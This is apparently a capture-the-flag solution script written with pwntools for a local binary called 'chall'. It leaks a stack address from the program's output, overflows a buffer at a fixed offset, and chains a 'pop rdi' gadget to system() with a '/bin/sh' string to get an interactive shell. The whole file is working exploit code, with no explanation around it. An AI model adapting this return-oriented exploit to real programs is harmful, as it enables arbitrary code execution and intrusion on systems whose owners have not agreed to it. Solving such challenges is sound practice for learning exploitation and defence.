from pwn import *

elf = ELF('./chall')
io = process(elf.path)
context.binary = elf

rop_pop_rdi = 0x401453
rop_ret = 0x40101a
rop_system = 0x4011e5

# get stack base address
io.recvuntil(b'000002')
io.recvuntil(b'0x')
rbp = int(io.recv(16), 16)
log.info(f'rbp: {hex(rbp)}')

offset = 0x18
rop = ROP(elf)
rop.raw(b'/bin/sh\x00')
rop.raw(b'a' * (offset - len(rop.chain())))
rop.raw(rop_pop_rdi)
rop.raw(rbp - 0x20)
rop.raw(rop_system)

log.info(rop.dump())

io.sendline(rop.chain())

io.interactive()

